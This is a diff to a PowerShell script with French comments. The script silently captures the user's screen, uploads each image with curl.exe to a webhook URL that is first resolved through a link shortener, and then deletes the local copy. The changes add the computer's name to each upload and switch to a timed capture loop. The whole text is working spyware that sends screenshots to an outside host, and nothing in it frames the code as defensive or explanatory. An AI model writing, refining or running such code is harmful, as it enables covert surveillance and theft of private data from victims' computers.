@@ -1,5 +1,6 @@
 $hookurl = "$dc"
-$a = 2 # Nombre de captures d'écran à prendre
+$seconds = 30 # Intervalle entre les captures d'écran en secondes
+$a = 1 # Nombre de captures d'écran à prendre
 
 # Détection de l'URL raccourcie
 if ($hookurl.Length -ne 121) {
@@ -7,7 +8,7 @@ if ($hookurl.Length -ne 121) {
     $hookurl = (irm $hookurl).url
 }
 
-# Fonction pour prendre une capture d'écran et l'envoyer
+# Fonction pour prendre une capture d'écran et l'envoyer avec le nom de l'ordinateur
 Function TakeAndSendScreenshot {
     $Filett = "$env:temp\SC$([System.Guid]::NewGuid()).png" # Utilisation d'un GUID unique pour le nom de fichier
     Add-Type -AssemblyName System.Windows.Forms
@@ -22,20 +23,16 @@ Function TakeAndSendScreenshot {
     $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
     $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
     Start-Sleep 1
-    curl.exe -F "file1=@$filett" $hookurl
+    $computerName = $env:COMPUTERNAME
+    $text = "Capture d'écran de $computerName"
+    curl.exe -F "file1=@$filett" -F "text=$text" $hookurl
     Start-Sleep 1
     Remove-Item -Path $filett
 }
 
-# Démarrer une tâche en arrière-plan pour prendre et envoyer les captures d'écran
-$job = Start-Job -ScriptBlock {
-    for ($i = 0; $i -lt $a; $i++) {
-        TakeAndSendScreenshot
-    }
+# Boucle pour prendre et envoyer les captures d'écran
+While ($a -gt 0) {
+    TakeAndSendScreenshot
+    Start-Sleep $seconds
+    $a--
 }
-
-# Attendre que la tâche en arrière-plan se termine
-Wait-Job $job | Out-Null
-
-# Supprimer la tâche en arrière-plan
-Remove-Job $job
